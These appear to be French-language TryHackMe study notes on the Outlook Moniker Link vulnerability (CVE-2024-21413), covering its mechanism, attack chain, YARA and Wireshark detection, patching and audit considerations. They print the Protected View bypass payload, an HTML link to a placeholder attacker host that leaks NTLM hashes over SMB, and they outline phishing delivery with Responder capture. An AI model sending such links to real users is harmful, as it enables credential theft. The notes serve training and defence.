Leak user's credentials using CVE-2024-21413 to bypass Outlook's Protected View.

# üîì Moniker Link (CVE-2024-21413)
#TryHackMe #Exploitation #CVE #Outlook #GRC

## 1. ‚öôÔ∏è The Technical Core
Une vuln√©rabilit√© critique d√©couverte par Check Point Research (Haifei Li) en F√©vrier 2024.
* **Target:** Microsoft Outlook (Office 2016, 2019, LTSC, 365).
* **Mechanism:** L'attaquant envoie un email avec un lien hypertexte sp√©cial (Moniker Link).
* **The Flaw:** Ce lien contourne le **Protected View** (le mode "lecture seule" s√©curis√© d'Outlook).
* **The Impact:**
    1.  **Credential Leak:** En cliquant, Outlook tente de se connecter au serveur de l'attaquant via SMB, envoyant automatiquement le **NTLM Hash** (mot de passe chiffr√©) de l'utilisateur.
    2.  **RCE (Remote Code Execution):** Potentiellement, l'attaquant peut ex√©cuter du code sur ta machine.

## 2. üìä Key Metrics (CVSS)
* **CVSS Score:** **9.8 / 10** (C'est √©norme).
* **Severity:** **Critical**.
* **Attack Complexity:** **Low** (Facile √† faire).

---

## üåç Vision GRC (Consultant Focus)
* **Patch Management (Urgence):**
    * Avec un score de 9.8 et touchant Outlook, c'est un **"Emergency Patch"**. Un auditeur v√©rifiera si le correctif de F√©vrier 2024 a √©t√© d√©ploy√© sous 48h.
* **Attack Vector (Phishing):**
    * La faille n√©cessite une interaction utilisateur (cliquer sur le lien). Cela renforce le besoin de campagnes de **Security Awareness**.
* **Risk Assessment:**
    * *Sc√©nario :* Compromission totale du r√©seau via vol d'identifiants (Credential Harvesting).

## üß† Rappel M√©moire
"**Moniker Link** = Le lien qui fait sortir Outlook de sa coquille (**Protected View**) pour donner tes cl√©s (**NTLM**) aux m√©chants."


# üîì Moniker Link: The Bypass Mechanism
#TryHackMe #Exploitation #CVE-2024-21413 #Outlook #Bypass

## 1. ‚öôÔ∏è The Concept (Moniker Link)
Outlook est con√ßu pour interpr√©ter le HTML et les liens.
* **Moniker Link:** C'est un type de lien sp√©cial qui demande √† Windows d'ouvrir une application externe (ex: `skype:`, `file:`).
* **Normal Behavior (Protected View):** Si tu envoies un lien `file://ATTACKER_IP/partage`, Outlook d√©tecte le danger (acc√®s SMB distant) et affiche une alerte de s√©curit√© bloquante ("This location may be unsafe").

## 2. üí• The Exploit (The Magic Character)
La faille r√©side dans la mani√®re dont Outlook analyse (parse) le lien.
* **The Trick:** En ajoutant un point d'exclamation (`!`) suivi de texte al√©atoire √† la fin du chemin, le moteur de s√©curit√© d'Outlook "bugue". Il ne reconna√Æt plus le lien comme dangereux et **ne d√©clenche pas le Protected View**.
* **Payload Comparison:**
    * üõ°Ô∏è *Blocked:* `<a href="file://ATTACKER_IP/test">Click me</a>` -> Popup de s√©curit√©.
    * üîì *Bypass:* `<a href="file://ATTACKER_IP/test!exploit">Click me</a>` -> **Pas de popup**, connexion directe !

## 3. üïµÔ∏è The Result (SMB Auth)
Une fois le lien cliqu√© (sans alerte), Windows tente de se connecter au partage r√©seau de l'attaquant via le protocole **SMB**.
* **Automatic Action:** Pour acc√©der √† un partage, Windows envoie automatiquement tes identifiants NTLM (Hash) pour s'authentifier. L'attaquant n'a plus qu'√† les r√©colter.

---

## üåç Vision GRC (Audit Focus)
* **Security Controls Failure:**
    * Ce cas illustre un √©chec du principe de **"Input Validation"**. Le filtre de s√©curit√© ne g√©rait pas correctement le caract√®re sp√©cial `!`.
* **Outbound Traffic Risks:**
    * *Question d'Audit :* "Pourquoi votre r√©seau autorise-t-il le trafic SMB (Port 445) sortant vers Internet ?"
    * *Rem√©diation GRC :* Bloquer le port 445 en sortie au niveau du Firewall p√©rim√©trique aurait rendu cette attaque inefficace, m√™me avec le bypass Outlook.

## üß† Rappel M√©moire
"Pour contourner le garde (Protected View), on ajoute un point d'exclamation (`!`). C'est comme crier 'Surprise !' pour le distraire."


# ‚öîÔ∏è Exploitation: The Attack Chain
#TryHackMe #Exploitation #Python #SocialEngineering #GRC

## 1. üõ†Ô∏è The Tooling (Python Script)
L'attaque repose sur un script (souvent nomm√© `exploit.py`) qui automatise l'envoi de l'email via SMTP.
* **Role du script :**
    1.  Se connecte au serveur mail cible.
    2.  Construit un email HTML.
    3.  Ins√®re le **Moniker Link** malveillant : `<a href="file://ATTACKER_IP/test!exploit">CLICK ME</a>`.
    4.  Envoie l'email √† la victime.

## 2. üé£ The Phishing & Execution
* **Action:** La victime re√ßoit un email qui semble l√©gitime (Urgent, Facture, etc.).
* **Trigger:** La victime clique sur le lien.
* **Bypass:** Gr√¢ce au `!`, Outlook ne bloque pas la requ√™te.
* **Payload:** Outlook tente de se connecter au partage SMB de l'attaquant (port 445).

## 3. üï∏Ô∏è The Capture (Responder)
Du c√¥t√© de l'attaquant, un outil d'√©coute (comme **Responder** ou un script d'√©coute SMB) est pr√™t.
* **Result:** D√®s que la connexion entrante arrive, l'outil capture le **NTLMv2 Hash** de la victime (son mot de passe chiffr√©).
* **Impact:** Ce hash peut √™tre "cass√©" (cracked) hors ligne pour retrouver le mot de passe en clair, ou utilis√© pour des attaques de type "Pass-the-Hash".

---

## üåç Vision GRC (Defense in Depth)
* **Firewalling (Egress Filtering):**
    * *R√®gle d'or :* Aucun poste utilisateur ne devrait pouvoir initier une connexion **SMB (Port 445)** vers Internet.
    * *Pourquoi ?* Si le pare-feu avait bloqu√© le 445 sortant, le lien aurait √©t√© cliqu√©, mais la fuite d'identifiants aurait √©chou√©. C'est l'√©chec de la "D√©fense en Profondeur".
* **Simulation (Red Teaming):**
    * Ce sc√©nario doit √™tre test√© lors des campagnes de phishing internes (sans payload r√©el) pour voir combien d'employ√©s cliquent malgr√© les avertissements.

## üß† Rappel M√©moire
"Le script `exploit.py` est le facteur qui livre la bombe.
Le clic est le d√©tonateur.
Le Firewall est le seul bouclier qui aurait pu arr√™ter l'explosion (la fuite SMB)."


# üïµÔ∏è Detection: Spotting the Attack
#TryHackMe #BlueTeam #YARA #Wireshark #GRC

## 1. üìú YARA Rules (Static Analysis)
Pour rep√©rer les emails malveillants *avant* qu'ils ne soient ouverts.
* **Le principe :** Florian Roth (une l√©gende de la d√©tection) a cr√©√© une r√®gle YARA qui scanne les emails √† la recherche du motif suspect `file:\` suivi de `!`.
* **La R√®gle Cl√© :**
    `strings: $s1 = "file:\\/\\/\\/\\\\[^""]{6,600}\\.(docx|txt|pdf|xlsx|...)[^""]{0,20}!"`
    * *Traduction :* "Cherche tout ce qui ressemble √† un lien fichier (`file://`) suivi d'une extension connue (`.docx`, `.pdf`) et qui se termine par un point d'exclamation (`!`)."

## 2. ü¶à Wireshark (Network Analysis)
Pour rep√©rer l'attaque *pendant* qu'elle se produit sur le r√©seau.
* **Le Trafic SMB :** L'attaque force Outlook √† initier une connexion SMB (Port 445).
* **L'Indice Visible :** Dans Wireshark, tu verras une requ√™te **NTLMSSP_NEGOTIATE** suivie d'une r√©ponse contenant le **NTLMv2 Hash** de la victime. C'est la preuve que les identifiants ont fuite.

---

## üåç Vision GRC (Monitoring & Incident Response)
* **SIEM Use Case :**
    * En tant que consultant, tu demanderas : *"Avez-vous des r√®gles de d√©tection pour les tentatives de sortie SMB ?"*
    * Si le pare-feu laisse passer le flux (mauvaise pratique), le **SIEM** doit au moins lever une alerte ("Workstation communicating on Port 445 to Public IP").
* **Forensics Readiness :**
    * Avoir les logs email et les captures r√©seau (PCAP) est indispensable pour prouver l'exfiltration de donn√©es apr√®s coup. Sans logs, pas de preuve.

## üß† Rappel M√©moire
"Pour d√©tecter le Moniker Link :
1. **Sur le Disque (YARA) :** On cherche le `!` dans les fichiers emails.
2. **Sur le R√©seau (Wireshark) :** On cherche le **SMB** qui sort l√† o√π il ne devrait pas."

# üõ°Ô∏è Remediation & Mitigation (CVE-2024-21413)
#TryHackMe #BlueTeam #Patching #Hardening #GRC

## 1. ü©π The Fix (Patching)
Il n'y a qu'une seule solution d√©finitive : **Mettre √† jour**.
* **Microsoft Action:** Correctif inclus dans le "Patch Tuesday" de F√©vrier 2024.
* **Procedure:** Via Windows Update ou le Catalogue Microsoft Update.
* *Note:* Comme la faille contourne le m√©canisme de "Protected View" lui-m√™me, aucune reconfiguration d'Outlook (ex: changer les settings de confiance) ne suffit. Il faut changer le code binaire (le patch).

## 2. üß± Defense in Depth (Mitigation)
Si le patch ne peut pas √™tre appliqu√© imm√©diatement (Legacy systems), on utilise des contr√¥les compensatoires :
* **Network Hardening:** Bloquer le trafic **SMB (Port 445)** sortant au niveau du pare-feu p√©rim√©trique.
    * *Nuance :* Attention, bloquer *tout* le SMB peut casser l'acc√®s aux serveurs de fichiers internes. On parle bien de bloquer **Vers Internet**.
* **User Awareness:**
    * Ne jamais cliquer sur des liens inattendus.
    * Pr√©visualiser les liens (survoler avec la souris) avant de cliquer.

---

## üåç Vision GRC (Patch Management Policy)
* **SLA (Service Level Agreement):**
    * Une faille critique (CVSS 9.8) comme celle-ci d√©clenche souvent une proc√©dure de "Patch d'Urgence" (ex: d√©ploiement sous 48h max, m√™me le week-end).
* **Vulnerability Scanning:**
    * Apr√®s le d√©ploiement, le consultant GRC demandera un nouveau scan de vuln√©rabilit√© pour confirmer que le parc est sain (**Verification Scan**).
* **Lessons Learned:**
    * Si l'entreprise avait bloqu√© le SMB sortant (Best Practice), l'impact aurait √©t√© nul. C'est un argument fort pour durcir les r√®gles de Firewall lors du prochain comit√© de s√©curit√©.

## üß† Rappel M√©moire
"Contre le Moniker Link :
1. **Patch** (Le rem√®de).
2. **Firewall 445** (Le bouclier).
3. **Cerveau** (Ne pas cliquer)."